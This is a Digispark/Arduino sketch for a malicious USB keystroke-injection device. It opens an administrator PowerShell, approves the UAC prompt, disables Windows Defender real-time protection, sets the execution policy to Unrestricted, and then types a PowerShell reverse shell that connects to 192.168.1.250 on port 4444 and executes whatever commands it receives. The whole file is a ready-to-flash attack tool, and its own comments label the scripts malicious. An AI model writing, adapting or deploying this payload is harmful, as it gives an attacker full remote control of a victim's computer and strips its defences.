#include "DigiKeyboard.h"
#include <avr/pgmspace.h>


// disable antivirus 
const PROGMEM char str0[] = {"Set-MpPreference -DisableRealtimeMonitoring $true"};

// allow malicious scripts to execute
const PROGMEM char str1[] = {"Set-ExecutionPolicy Unrestricted"};

// reverse shell
const PROGMEM char str2[] = {"$sm=(New-Object Net.Sockets.TCPClient(\"192.168.1.250\",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"};

const char *const str_table[] PROGMEM = {str0, str1, str2};
char buf[300];

void setup() {
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(0);

  launchPowershell();
  desc(0);
  desc(1);
  desc(2);
}

void launchPowershell() {
  // 'x' + windows key

  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // 'a' --> opens up windows powershell admin mode 
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
}

void desc(int i) {
  strcpy_P(buf, (char *)pgm_read_word(&(str_table[i])));  // Necessary casts and dereferencing, just copy.
  DigiKeyboard.println(buf);
}

void loop() {}
